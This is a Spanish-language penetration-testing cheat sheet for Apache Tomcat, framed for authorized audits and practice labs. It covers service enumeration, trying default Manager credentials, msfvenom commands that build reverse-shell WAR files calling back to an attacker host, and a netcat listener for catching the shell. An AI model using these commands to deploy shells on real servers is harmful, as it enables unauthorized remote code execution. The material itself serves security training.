# Apache Tomcat

> **Puerto por defecto:** `8080/TCP`

Apache Tomcat es un servidor de aplicaciones Java utilizado para desplegar aplicaciones web (`.war`). Durante una auditoría, si el **Manager App** está accesible y se obtienen credenciales válidas (o se utilizan las credenciales por defecto en un entorno de laboratorio), es posible desplegar una aplicación para comprobar el nivel de acceso autorizado.

---

# Enumeración

## Detectar el servicio

```bash
nmap -sV -p8080 <IP>
```

## Acceder al panel web

```
http://<IP>:8080
```

Si el **Tomcat Manager** solicita autenticación:

* Probar credenciales por defecto si se trata de un laboratorio o una instalación no endurecida.
* En algunos entornos, pulsar **Cancel** puede permitir visualizar información adicional o enlaces accesibles sin autenticación.

---

# Despliegue de una aplicación WAR (entornos autorizados)

Una vez autenticado en el **Tomcat Manager**, localizar la sección **Deploy** para subir un archivo `.war`.

## Generar un WAR

### Payload 1

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f war -o reverse1.war
```

### Payload 2

```bash
msfvenom -p java/jsp_shell_tcp LHOST=<LHOST> LPORT=443 -f war -o reverse2.war
```

---

# Listener

Preparar un listener antes de desplegar la aplicación.

```bash
nc -nlvp 443
```

---

# Despliegue

1. Acceder al **Tomcat Manager**.
2. En la sección **Deploy**, seleccionar el archivo `.war`.
3. Subir la aplicación.
4. Acceder a la ruta donde se ha desplegado para verificar el funcionamiento.

Si has generado varias aplicaciones, prueba cuál de ellas funciona correctamente en el entorno del laboratorio.

---

# Herramientas útiles

| Herramienta  | Descripción                                              |
| ------------ | -------------------------------------------------------- |
| `nmap`       | Identificación del servicio y versión.                   |
| `curl`       | Comprobación de cabeceras HTTP y autenticación.          |
| `msfvenom`   | Generación de aplicaciones WAR para pruebas autorizadas. |
| `netcat`     | Listener para recibir conexiones durante las pruebas.    |
| `Metasploit` | Framework para pruebas de seguridad sobre Tomcat.        |

---

> **Consejo:** En laboratorios como Hack The Box, TryHackMe o PWK es habitual encontrar instalaciones de Tomcat con el **Manager App** expuesto. Antes de intentar desplegar una aplicación, verifica la versión del servidor, busca credenciales por defecto o reutilizadas y comprueba si el panel de administración está accesible.
